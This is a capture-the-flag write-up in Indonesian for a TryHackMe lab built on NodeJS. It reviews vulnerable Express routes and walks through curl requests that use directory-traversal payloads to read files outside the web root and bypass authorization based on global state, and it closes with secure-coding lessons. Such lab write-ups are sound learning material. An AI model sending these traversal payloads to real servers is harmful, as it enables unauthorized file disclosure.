---
title: "Writeup: Capture The Flag - TryHackMe 'Mother's Secret'"
date: "2026-02-26"
category: "Writeup"
tags: "CTF, THM, Medium, Linux, Web, NodeJS, LFI, Code Analysis"
author: "Paperalt"
description: "Writeup komprehensif untuk room Mother's Secret di TryHackMe. Room yang berfokus pada Code Analysis dan eksploitasi Local File Inclusion (LFI) pada endpoint API NodeJS."
---

## Reconnaissance

Mulailah dengan mengakses aplikasi dan meninjau informasi awal. Aplikasi ini berjalan di `http://<IP_TARGET>/`. Target utama dari room ini adalah *code analysis* alih-alih pemindaian port konvensional.

## Enumeration

### Static Code Analysis
Langkah pertama pada room ini berfokus pada analisis *source code* dari aplikasi NodeJS/Express yang diberikan. Disediakan file yang berisi routing logika dari API, yaitu `yaml.js` dan `nostromo.js`.

**1. Analisis `yaml.js`**
Berikut adalah bagian *source code* yang menjadi *point of interest*:
```javascript
import express from "express";
import yaml from "js-yaml";
import fs from "fs";
import { attachWebSocket } from "../websocket.js";

const Router = express.Router();

const isYaml = (filename) => filename.split(".").pop() === "yaml";

Router.post("/", (req, res) => {
  let file_path = req.body.file_path;
  const filePath = `./public/${file_path}`;

  if (!isYaml(filePath)) {
    res.status(500).json({
      status: "error",
      message: "Not a YAML file path.",
    });
    return;
  }

  fs.readFile(filePath, "utf8", (err, data) => {
    if (err) {
      res.status(500).json({
        status: "error",
        message: "Failed to read the file.",
      });
      return;
    }

    res.status(200).send(yaml.load(data));

    attachWebSocket().of("/yaml").emit("yaml", "YAML data has been processed.");
  });
});

export default Router;
```
**Bugs Ditemukan:** Parameter `req.body.file_path` digunakan secara langsung di `fs.readFile` tanpa filter (hanya divalidasi harus berakhiran `.yaml`). Ini merupakan titik injeksi **Local File Inclusion (LFI)** menggunakan teknik *Directory Traversal* (`../`).

**2. Analisis `nostromo.js`**
Rute ini berisi rahasia yang lebih mendalam, tetapi diamankan dengan filter kustom:
```javascript
import express from "express";
import fs from "fs";
// import { attachWebSocket } from "../../mothers_secret_challenge/websocket.js";
import { attachWebSocket } from "../websocket.js";
import { isYamlAuthenticate } from "./yaml.js";
let isNostromoAuthenticate = false;

const Router = express.Router();

Router.post("/nostromo", (req, res) => {
  let file_path = req.body.file_path;
  const filePath = `./public/${file_path}`;

  fs.readFile(filePath, "utf8", (err, data) => {
    if (err) {
      res.status(500).json({
        status: "error",
        message: "Science Officer Eyes Only",
      });
      return;
    }

    isNostromoAuthenticate = true
    res.status(200).send(data);

    attachWebSocket()
      .of("/nostromo")
      .emit("nostromo", "Nostromo data has been processed.");
  });
});

Router.post("/nostromo/mother", (req, res) => {
 
  let file_path = req.body.file_path;
  const filePath = `./mother/${file_path}`;

  if(!isNostromoAuthenticate || !isYamlAuthenticate){
    res.status(500).json({
      status: "Authentication failed",
      message: "Kindly visit nostromo & yaml route first.",
    });
    return 
  }

  fs.readFile(filePath, "utf8", (err, data) => {
    if (err) {
      res.status(500).json({
        status: "error",
        message: "Science Officer Eyes Only",
      });
      return;
    }

    res.status(200).send(data);

    // attachWebSocket()
    //   .of("/nostromo")
    //   .emit("nostromo", "Nostromo data has been processed.");
  });
});

export default Router;
```
**Bugs Ditemukan:** NodeJS module memiliki status memori yang persisten. Jika kita berhasil membuat variabel `isNostromoAuthenticate = true` dan variabel dari rute sebelah (`isYamlAuthenticate = true`) menjadi `true` dengan cara me-*request* pembacaan *file* apa saja yang valid, maka status *authentication* tersebut akan terbypass selamanya untuk *request* `/nostromo/mother` selanjutnya.

Terdapat hint mengenai *emergency command override* dari petunjuk awal:
*   **Emergency command override**: [REDACTED]

## Vulnerability Analysis

Ringkasan kelemahan sistem berdasarkan *code review*:
1. **Directory Traversal (LFI)**: Ketiadaan sanitasi input path pada blok `fs.readFile(./public/${file_path})`.
2. **Global State Variable Manipulation**: Menggunakan Global Variable (`let`) dan pengecekan boolean `(!isNostromoAuthenticate || !isYamlAuthenticate)` untuk otorisasi endpoint rahasia. Sekali sistem menganggap "True" (karena kita me-*request* sebuah file yang sah/ada), maka akses terekspos terbuka lebar.

## Exploitation

Berikut adalah panduan penyelesaian langkah demi langkah berdasarkan pertanyaan:

### What is the number of the emergency command override?
Berdasarkan tema *room* fiksi sains film klasik **Alien (1979)**, kita berperan sebagai kru pesawat *Nostromo* yang berhadapan dengan AI bernama *Mother*. Kode *emergency command override* ini tidak terdapat secara harfiah di dalam *source code*, melainkan bagian dari *trivia* film (OSINT). Dalam film tersebut, perwira Ripley menggunakan kode darurat log-in khusus untuk menimpa prioritas Mother.
**Answer:** `[REDACTED]`

### What is the special order number?
Gunakan nomor *emergency override* yang telah Anda temukan untuk mengirim request ke endpoint `/yaml`:
```bash
curl -X POST http://<IP_TARGET>/yaml \
     -H "Content-Type: application/json" \
     -d '{"file_path": "<REDACTED>.yaml"}'
```
Sistem akan memberikan respons `REROUTING TO: api/nostromo ORDER: 0rd3r937.txt`.
**Answer:** `[REDACTED]`

### What is the hidden flag in the Nostromo route?
Pertama, lakukan *bypass* variabel global `isYamlAuthenticate` melalui skenario *Local File Inclusion* (membaca file `/etc/netplan/50-cloud-init.yaml`):
```bash
curl -X POST http://<IP_TARGET>/yaml \
     -H "Content-Type: application/json" \
     -d '{"file_path": "../../../../../../../../etc/netplan/50-cloud-init.yaml"}'
```
Kemudian kirim *request* ke Nostromo untuk membaca `0rd3r937.txt` sekaligus membocorkan *hidden flag*:
```bash
curl -X POST http://<IP_TARGET>/api/nostromo \
     -H "Content-Type: application/json" \
     -d '{"file_path": "0rd3r937.txt"}'
```
**Answer:** `Flag{[REDACTED]}`

### What is the name of the Science Officer with permissions?
Berdasarkan hasil analisis pada *frontend javascript* di file `/index.min.js` (dengan melakukan ekstraksi *base64 decode*), kita mendapat nama perwira sains:
**Answer:** `[REDACTED]`

### What are the contents of the classified "Flag" box?
Masih di hasil *decoding* `/index.min.js`, terdapat status "CLASSIFIED" yang menyimpan salah satu flag utuh:
**Answer:** `THM_FLAG{[REDACTED]}`

## Privilege Escalation

### Where is Mother's secret?
Setelah kedua variabel keamanan (YAML dan Nostromo) terbuka untuk sesi saat ini, kita bisa menanyakan lokasi rahasia `secret.txt` pada sistem Mother:
```bash
curl -X POST http://<IP_TARGET>/api/nostromo/mother \
     -H "Content-Type: application/json" \
     -d '{"file_path": "secret.txt"}'
```
Sistem kemudian menjawab lokasi absolut dalam server.
**Answer:** `[REDACTED]`

## Root Flag

### What is Mother's secret?
Layaknya eksploitasi Route Nostromo, gunakan LFI Traversal untuk membaca file rahasia dari Root server.
```bash
curl -X POST http://<IP_TARGET>/api/nostromo/mother \
     -H "Content-Type: application/json" \
     -d '{"file_path": "../../../../../../../../opt/m0th3r"}'
```
Pembacaan ini mengeksekusi *end-game* yang memberikan Root Flag sesungguhnya.
**Answer:** `Flag{[REDACTED]}`

## Lessons Learned

1.  Selalu sanitasi input *user* ketika melakukan operasi *file stream* (mencegah Directory Traversal/LFI).
2.  Jangan pernah menyimpan status *authentication* atau *authorization* dalam *global variable module* di NodeJS, karena variabel tersebut di-share di seluruh sesi dan koneksi. Gunakan token (JWT) atau express-sessions.
3.  Pembacaan *source code* (Code Review) yang cermat bisa mengungkap alur fatal yang tidak terlihat dari pemindaian otomatis luar.
